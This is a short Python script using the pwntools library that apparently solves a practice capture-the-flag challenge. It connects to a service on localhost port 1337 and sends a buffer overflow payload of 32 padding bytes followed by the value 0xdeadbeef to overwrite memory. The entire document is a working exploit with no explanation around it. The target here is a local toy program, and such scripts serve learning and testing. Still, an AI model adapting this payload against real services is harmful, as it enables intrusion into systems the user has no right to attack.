from pwn import *


connect = remote('127.0.0.1', 1337)

print(connect.recvn(18))
payload = "A"*32
payload += p32(0xdeadbeef)
connect.send(payload)
print(connect.recvn(34))
